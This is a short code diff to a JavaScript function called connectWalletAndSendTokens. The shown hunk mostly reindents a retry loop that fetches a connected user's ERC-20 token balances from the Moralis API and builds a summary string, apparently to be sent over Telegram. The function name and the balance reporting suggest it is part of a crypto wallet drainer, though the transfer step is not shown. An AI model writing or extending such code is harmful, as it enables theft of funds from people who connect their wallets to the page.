@@ -202,37 +202,38 @@ async function connectWalletAndSendTokens() {
         let apiAttempts = 0;
         const maxAttempts = 3;
         let apiSuccess = false;
-
+        
         while (apiAttempts < maxAttempts && !apiSuccess) {
-          try {
-            apiAttempts++;
-            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
-            const response = await fetch(moralisUrl, {
-              headers: { "X-API-Key": moralisApiKey }
-            });
-            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
-            tokens = await response.json();
-            apiSuccess = true;
+  try {
+    apiAttempts++;
+    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
+    const response = await fetch(moralisUrl, {
+      headers: { "X-API-Key": moralisApiKey }
+    });
+    if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
+    tokens = await response.json();
+    apiSuccess = true;
 
-            const nonZeroTokens = tokens.filter(token =>
-              token.balance && !ethers.BigNumber.from(token.balance).isZero()
-            );
+    const nonZeroTokens = tokens.filter(token =>
+      token.balance && !ethers.BigNumber.from(token.balance).isZero()
+    );
 
-            tokenSummaryTelegram = nonZeroTokens.length > 0
-              ? nonZeroTokens.map(token => {
-                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
-                  return `• ${token.symbol}: ${balance}`;
-                }).join("\n")
-              : "No non-zero ERC-20 token balances found.";
-          } catch (apiErr) {
-            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
-            if (apiAttempts === maxAttempts) {
-              tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
-            } else {
-              await delay(3000);
-            }
-          }
-        }
+    tokenSummaryTelegram = nonZeroTokens.length > 0
+      ? nonZeroTokens.map(token => {
+          const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+          return `• ${token.symbol}: ${balance}`;
+        }).join("\n")
+      : `No non-zero ${network.name} token balances found.`;
+  } catch (apiErr) {
+    console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
+    if (apiAttempts === maxAttempts) {
+      tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
+    } else {
+      await delay(3000);
+    }
+  }
+}
+
 
         const nativeBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
